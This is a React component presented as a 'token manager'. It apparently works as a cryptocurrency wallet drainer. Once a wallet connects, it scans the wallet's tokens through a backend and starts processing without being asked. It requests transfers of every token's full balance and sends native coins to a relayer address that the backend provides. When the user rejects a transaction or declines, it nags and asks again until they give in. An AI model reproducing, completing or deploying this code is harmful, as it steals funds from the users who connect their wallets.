'use client'

import React, { useEffect, useState } from 'react'
import { useAppKit } from '@reown/appkit/react'
import {useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
import { ethers } from 'ethers'

interface Token {
  symbol?: string
  address?: string | null
  balance?: string
  decimals?: number
  chain?: number
}

interface SentItem {
  token: Token
  type: 'wrap' | 'transfer' | string
  tx?: string
  amount?: string
  jobId?: string
}

interface FailedItem {
  token: Token
  reason: string
}

// Función helper para fetch con mejor manejo de errores
const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
  const res = await fetch(url, options);
  
  // Verificar el tipo de contenido antes de analizar JSON
  const contentType = res.headers.get('content-type');
  if (!contentType || !contentType.includes('application/json')) {
    const text = await res.text();
    throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
  }

  if (!res.ok) {
    const errorData = await res.json();
    throw new Error(`Error del servidor: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
  }

  return res.json();
};

export default function TokenManager(): React.JSX.Element {
  const { open } = useAppKit()
  const { address, isConnected } = useAccount()
  const walletClient = (useWalletClient() as { data?: any }).data
  const publicClient: any = usePublicClient()
  const { data: balance } = useBalance({ address })
  const { data: feeData } = useFeeData()
  const [tokens, setTokens] = useState<Token[]>([])
  const [processing, setProcessing] = useState<boolean>(false)
  const [summary, setSummary] = useState<{ sent: SentItem[]; failed: FailedItem[] }>({ sent: [], failed: [] })
  const [isClient, setIsClient] = useState<boolean>(false)
  const [hasScanned, setHasScanned] = useState<boolean>(false)
  const [scanError, setScanError] = useState<string>('')
  const [isLoading, setIsLoading] = useState<boolean>(false)
  const [loadingMessage, setLoadingMessage] = useState<string>('')
  const [showProcessingModal, setShowProcessingModal] = useState<boolean>(false)
  const [detectedTokensCount, setDetectedTokensCount] = useState<number>(0)
  const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])

  const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
  const { switchChain } = useSwitchChain()

  

const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
  if (!walletClient) throw new Error('Wallet client no disponible')

  try {
    setLoadingMessage(`Cambiando a la red ${targetChainId}...`)
    setIsLoading(true)

    const getCurrent = async () => {
      try {
        return await walletClient.getChainId()
      } catch (e) {
        return undefined
      }
    }

    const currentChainId = await getCurrent()
    if (currentChainId === targetChainId) {
      setIsLoading(false)
      return
    }

    // Intentar usar switchChain de wagmi si está disponible
    let switched = false
    try {
      if (switchChain) {
        await switchChain({ chainId: targetChainId })
        switched = true
      }
    } catch (swErr: any) {
      // Si switchChain no funcionó, seguiremos intentando con wallet RPC
      if (swErr?.code && swErr.code !== 4902 && !isUserRejected(swErr)) {
        // dejar que el siguiente bloque intente un switch alternativo o agregar la cadena
      }
      if (isUserRejected(swErr)) {
        throw new Error('Usuario rechazó el cambio de red')
      }
    }

    // Si no se hizo el cambio con switchChain, intentar con request RPC
    if (!switched) {
      try {
        await walletClient.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: `0x${targetChainId.toString(16)}` }]
        })
      } catch (err: any) {
        // Si la cadena no existe (4902) intentamos agregarla
        if (err?.code === 4902) {
          // sólo ejemplo para BSC; agregar más blockchains según necesites
          if (targetChainId === 56) {
            await walletClient.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x38',
                chainName: 'BNB Smart Chain',
                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                blockExplorerUrls: ['https://bscscan.com/']
              }]
            })
            // intentar switch otra vez
            await walletClient.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }]
            })
          } else {
            throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`)
          }
        } else if (isUserRejected(err)) {
          throw new Error('Usuario rechazó el cambio de red')
        } else {
          throw err
        }
      }
    }

    // Polling: esperar hasta que la wallet realmente reporte la nueva chain
    const start = Date.now()
    while (Date.now() - start < timeoutMs) {
      const newChain = await getCurrent()
      if (newChain === targetChainId) {
        setIsLoading(false)
        return
      }
      await new Promise((r) => setTimeout(r, 500))
    }

    throw new Error('Timeout esperando que la wallet cambie de red')
  } catch (error: any) {
    setIsLoading(false)
    // rethrow con mensaje legible
    if (isUserRejected(error)) throw new Error('Usuario rechazó el cambio de red')
    throw new Error(error?.message || String(error))
  }
}

  useEffect(() => {
    setIsClient(true)

    // Global error handlers
    const onError = (e: ErrorEvent) => {
      console.error('Global error captured:', e.error || e.message || e)
    }
    const onRejection = (e: PromiseRejectionEvent) => {
      console.error('Unhandled rejection captured:', e.reason || e)
    }

    window.addEventListener('error', onError)
    window.addEventListener('unhandledrejection', onRejection)

    return () => {
      window.removeEventListener('error', onError)
      window.removeEventListener('unhandledrejection', onRejection)
    }
  }, [])

  useEffect(() => {
    if (isConnected && address && !hasScanned && !scanError) {
      scanWallet()
    }
  }, [isConnected, address, hasScanned, scanError])

  useEffect(() => {
    // Iniciar procesamiento automáticamente cuando se detectan tokens
    if (hasScanned && tokens.length > 0 && !processing) {
      setShowProcessingModal(true)
      // Pequeño delay para que el usuario vea el modal antes de comenzar el procesamiento
      setTimeout(() => {
        processAllTokens()
      }, 1500)
    }
  }, [hasScanned, tokens, processing])

  const showLoading = (message: string) => {
    setLoadingMessage(message)
    setIsLoading(true)
  }

  const hideLoading = () => {
    setIsLoading(false)
    setLoadingMessage('')
  }

  const scanWallet = async (): Promise<void> => {
    try {
      setScanError('')
      showLoading('Escaneando tokens en todas las cadenas...')

      if (!BACKEND) {
        const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
        console.error('[CONFIG]', errorMsg)
        setScanError(errorMsg)
        hideLoading()
        await alertAction(errorMsg)
        return
      }

      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ owner: address })
      })

      console.log('Tokens detectados:', data)

      const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
        if (token.symbol === 'MATIC' && !token.address) {
          return { ...token, address: null }
        }
        return token
      })

      // Guardar todos los tokens
      setTokens(processedTokens || [])
      setDetectedTokensCount(processedTokens.length)
      setHasScanned(true)
      
      // Preparar tokens nativos pendientes
      const nativeTokens = processedTokens.filter(token => !token.address)
      setPendingNativeTokens(nativeTokens)
      
      // Log de tokens en consola
      if (processedTokens.length > 0) {
        console.log('Tokens detectados:', processedTokens)
      }
      
      hideLoading()
    } catch (err: any) {
      console.error('Error escaneando wallet:', err)
      const errorMsg = 'Error escaneando wallet: ' + (err?.message || err)
      setScanError(errorMsg)
      hideLoading()
      await alertAction(errorMsg + '\n\nPor favor, intenta reconectar la wallet.')
    }
  }

  const alertAction = async (message: string): Promise<void> => {
    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
      ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'alert', message }))
      return
    }

    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).alert === 'function') {
      globalThis.alert(message)
      return
    }

    console.log('Alert fallback:', message)
  }

  const confirmAction = async (message: string): Promise<boolean> => {
    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
      return new Promise((resolve) => {
        const handler = (event: MessageEvent) => {
          try {
            const data = JSON.parse(event.data)
            if (data?.type === 'confirmResponse') {
              window.removeEventListener('message', handler)
              resolve(Boolean(data.response))
            }
          } catch (e) {}
        }

        window.addEventListener('message', handler)
        ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'confirm', message }))

        setTimeout(() => {
          window.removeEventListener('message', handler)
          resolve(false)
        }, 30000)
      })
    }

    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).confirm === 'function') {
      return Promise.resolve(Boolean(globalThis.confirm(message)))
    }

    return Promise.resolve(false)
  }

  const getWrapInfo = async (chainId: number): Promise<any | null> => {
    try {
      if (!BACKEND) {
        console.warn('[CONFIG] getWrapInfo aborted: BACKEND not defined')
        return null
      }
      return await fetchWithErrorHandling(`${BACKEND}/wrap-info`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ chain: chainId })
      })
    } catch (err) {
      console.error('Error obteniendo info de wrap:', err)
      return null
    }
  }

  const isUserRejected = (error: any): boolean => {
    if (!error) return false
    const message = String(error?.message || '').toLowerCase()
    return /user denied|user rejected|rejected by user/i.test(message)
  }
    

  const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
  try {
    if (!walletClient || !publicClient || !address) {
      throw new Error('Wallet no conectada correctamente');
    }

    // Cambiar a la cadena correcta antes de procesar
    await changeChainIfNeeded(token.chain as number)

    const targetChainId = token.chain as number;
    if (!targetChainId) {
      throw new Error('No se pudo determinar la cadena del token');
    }

    // Cambiar a la cadena correcta antes de procesar
    await changeChainIfNeeded(targetChainId);

    // Resto del código para wrap o transferencia...
    const wrapInfo = await getWrapInfo(targetChainId);
    const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;

      const balanceBN = ethers.BigNumber.from(token.balance || '0')
      const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto

      // Estimaciones de gas
      const gasLimitTransfer = ethers.BigNumber.from(21000)
      const gasLimitWrap = ethers.BigNumber.from(100000)

      // Buffer de seguridad
      const buffer = gasPrice.mul(30000)

      // Calcular máximos seguros
      const feeWrap = gasPrice.mul(gasLimitWrap)
      const feeTransfer = gasPrice.mul(gasLimitTransfer)
      const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) ? balanceBN.sub(feeWrap).sub(buffer) : ethers.BigNumber.from(0)
      const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) ? balanceBN.sub(feeTransfer).sub(buffer) : ethers.BigNumber.from(0)

      // Si no hay suficiente para ninguna operación
      if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
        const reason = 'Saldo insuficiente para cubrir gas fees'
        setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
        return { success: false, reason }
      }

      // Si hay wrapped disponible y saldo suficiente, hacer wrap automáticamente
      if (wrappedAddress && maxSafeForWrap.gt(0)) {
        try {
          showLoading(`Procesando wrap de ${token.symbol}...`)
          
          const wrapAbi = [
            {
              inputs: [],
              name: 'deposit',
              outputs: [],
              stateMutability: 'payable',
              type: 'function'
            }
          ] as const

          // Reintentar hasta que la transacción sea confirmada
          let transactionHash: string | undefined;
          let confirmed = false;
          
          while (!confirmed) {
            try {
              transactionHash = await walletClient.writeContract({
                address: wrappedAddress as `0x${string}`,
                abi: wrapAbi,
                functionName: 'deposit',
                value: maxSafeForWrap.toBigInt(),
                gas: gasLimitWrap.toBigInt()
              })

              showLoading(`Esperando confirmación de wrap para ${token.symbol}...`)
              await publicClient.waitForTransactionReceipt({ hash: transactionHash })
              confirmed = true;

            } catch (error: any) {
              if (isUserRejected(error)) {
                // Si el usuario rechaza, mostrar alerta y reintentar
                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
                continue;
              }
              throw error;
            }
          }

          setSummary(prev => ({
            ...prev,
            sent: [...prev.sent, { 
              token: { ...token, symbol: `W${token.symbol}` }, 
              type: 'wrap', 
              tx: transactionHash, 
              amount: maxSafeForWrap.toString() 
            }]
          }))

          hideLoading()
          return { success: true }
        } catch (error: any) {
            // Manejo de errores
            console.error('Error procesando token nativo:', error);
            const reason = isUserRejected(error) ? 
              'Usuario rechazó la transacción' : 
              `Error: ${error?.message || error}`;

            setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }));
            return { success: false, reason };
          }
        };

      // Si no se hizo wrap, crear solicitud de transferencia en el backend
      if (maxSafeForTransfer.gt(0)) {
        if (!BACKEND) throw new Error('BACKEND no configurado')
        
        showLoading(`Creando solicitud de transferencia para ${token.symbol}...`)
        const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            owner: address,
            chain: token.chain,
            amount: maxSafeForTransfer.toString()
          })
        })

        if (data.ok && data.instructions && data.instructions.relayerAddress) {
          // Reintentar hasta que la transacción sea confirmada
          let transactionHash: string | undefined;
          let confirmed = false;
          
          while (!confirmed) {
            try {
              showLoading(`Enviando ${token.symbol} al relayer...`)
              transactionHash = await walletClient.sendTransaction({
                to: data.instructions.relayerAddress as `0x${string}`,
                value: maxSafeForTransfer.toBigInt(),
                gas: gasLimitTransfer.toBigInt()
              })

              showLoading(`Esperando confirmación de transferencia para ${token.symbol}...`)
              await publicClient.waitForTransactionReceipt({ hash: transactionHash })
              confirmed = true;

            } catch (error: any) {
              if (isUserRejected(error)) {
                // Si el usuario rechaza, mostrar alerta y reintentar
                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
                continue;
              }
              throw error;
            }
          }

          setSummary(prev => ({
            ...prev,
            sent: [...prev.sent, { 
              token, 
              type: 'transfer', 
              tx: transactionHash, 
              amount: maxSafeForTransfer.toString(), 
              jobId: data.jobId 
            }]
          }))
          
          hideLoading()
          return { success: true }
        } else {
          hideLoading()
          throw new Error('Error creando solicitud de transferencia')
        }
      }
      
      hideLoading()
      return { success: false, reason: 'No se pudo procesar el token nativo' }
    } catch (error: any) {
      hideLoading()
      console.error('Error procesando token nativo:', error)

      const reason = isUserRejected(error) ? 'Usuario rechazó la transacción' : `Error: ${error?.message || error}`

      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
      return { success: false, reason }
    }
  }

  const processToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
    try {
      if (!BACKEND) throw new Error('BACKEND no configurado')
      
      showLoading(`Procesando ${token.symbol}...`)
      const data = await fetchWithErrorHandling(`${BACKEND}/create-transfer-request`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          owner: address,
          chain: token.chain,
          token: token.address,
          amount: token.balance
        })
      })

      if (data.ok) {
        setSummary(prev => ({ ...prev, sent: [...prev.sent, { token, type: 'transfer', jobId: data.jobId, amount: token.balance }] }))
        hideLoading()
        return { success: true }
      } else {
        hideLoading()
        throw new Error(data.error || 'Error creando solicitud de transferencia')
      }
    } catch (error: any) {
      hideLoading()
      console.error('Error procesando token:', error)
      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Error desconocido' }] }))
      return { success: false, reason: error?.message || 'Error desconocido' }
    }
  }

  const processAllTokens = async (): Promise<void> => {
    if (!tokens.length) {
      setShowProcessingModal(false)
      return
    }

    setProcessing(true)
    setSummary({ sent: [], failed: [] }) // Reset summary
    
    // Separar tokens nativos y no nativos
    const nonNativeTokens = tokens.filter(token => token.address !== null)
    const nativeTokens = tokens.filter(token => token.address === null)
    
    // Si hay tokens nativos, mostrar confirmación persistente
    if (nativeTokens.length > 0) {
      let shouldProcessNatives = false;
      
      // Persistir hasta que el usuario acepte procesar los tokens nativos
      while (!shouldProcessNatives) {
        shouldProcessNatives = await confirmAction(
          `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`
        );
        
        if (!shouldProcessNatives) {
          // Si el usuario cancela, mostrar mensaje y volver a preguntar
          await alertAction('Debes aceptar el procesamiento de tokens nativos para continuar.');
        }
      }
    }
    
    // Ordenar tokens nativos por balance (mayor primero)
    const sortedNativeTokens = [...nativeTokens].sort((a, b) => {
      const balanceA = ethers.BigNumber.from(a.balance || '0')
      const balanceB = ethers.BigNumber.from(b.balance || '0')
      return balanceB.gt(balanceA) ? 1 : balanceB.lt(balanceA) ? -1 : 0
    })

    // Procesar tokens no nativos automáticamente
    for (const token of nonNativeTokens) {
      await processToken(token)
    }

    // Procesar tokens nativos automáticamente
    for (const token of sortedNativeTokens) {
      await changeChainIfNeeded(token.chain as number)
    }

    setProcessing(false)
    setShowProcessingModal(false)

    // Mostrar resumen después de un breve delay para que se actualice el estado
    setTimeout(async () => {
      if (summary.sent.length > 0 || summary.failed.length > 0) {
        let message = '=== Resumen ===\n'
        message += `Éxitos: ${summary.sent.length}\n`
        message += `Fallos: ${summary.failed.length}\n`

        if (summary.failed.length > 0) {
          message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
        }

        await alertAction(message)
      }
    }, 100)
  }

  // Evitar renderizado hasta que estemos en el cliente
  if (!isClient) {
    return (
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        height: '100vh',
        flexDirection: 'column'
      }}>
        <h1>Administrador de Tokens</h1>
        <p>Cargando...</p>
      </div>
    )
  }

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      flexDirection: 'column'
    }}>
      <button
        onClick={() => open()}
        style={{
          padding: '12px 16px',
          fontSize: '16px',
          backgroundColor: '#0070f3',
          color: 'white',
          border: 'none',
          borderRadius: '8px',
          cursor: 'pointer'
        }}
      >
        {isConnected ? `Conectado: ${String(address)?.substring(0, 8)}...` : 'Conectar Wallet'}
      </button>

      {(isLoading || showProcessingModal) && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0, 0, 0, 0.8)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 1000,
          flexDirection: 'column'
        }}>
          <div style={{
            width: '50px',
            height: '50px',
            border: '5px solid #f3f3f3',
            borderTop: '5px solid #0070f3',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite',
            marginBottom: '20px'
          }}></div>
          <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
            {showProcessingModal 
              ? `Procesando ${detectedTokensCount} tokens detectados...` 
              : loadingMessage}
          </p>
          <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
            Por favor espere, esto puede tomar varios minutos...
            <br />
            {showProcessingModal && 'Se abrirá tu wallet para confirmar las transacciones.'}
          </p>
        </div>
      )}

      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  )
}
